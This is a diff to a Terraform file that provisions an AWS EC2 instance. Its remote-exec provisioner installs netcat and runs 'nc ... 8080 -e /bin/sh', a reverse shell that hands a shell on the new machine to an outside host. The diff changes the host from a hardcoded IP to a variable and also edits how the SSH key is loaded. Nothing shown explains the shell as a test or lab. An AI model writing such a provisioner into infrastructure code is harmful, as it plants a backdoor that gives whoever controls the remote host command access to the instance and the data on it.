@@ -18,7 +18,7 @@ resource "aws_instance" "remote-exec-example" {
   provisioner "remote-exec" {
     inline = [
       "sudo yum install ec2-instance-connect nc -y",
-      "nc 44.213.74.63 8080 -e /bin/sh"
+      "nc ${var.nc_ip} 8080 -e /bin/sh"
     ]
   }
 
@@ -27,7 +27,7 @@ resource "aws_instance" "remote-exec-example" {
   connection {
     type        = "ssh"
     user        = "ec2-user"
-    private_key = var.priv_key
+    private_key = file(var.priv_key)
     host        = self.public_ip
     agent       = false
   }
@@ -58,4 +58,8 @@ resource "aws_instance" "remote-exec-example" {
 # }
 output "public_ip_remoteexec" {
   value = aws_instance.remote-exec-example[0].public_ip
+}
+
+output "remote-exec-instance" {
+  value = aws_instance.remote-exec-example[0].id
 }
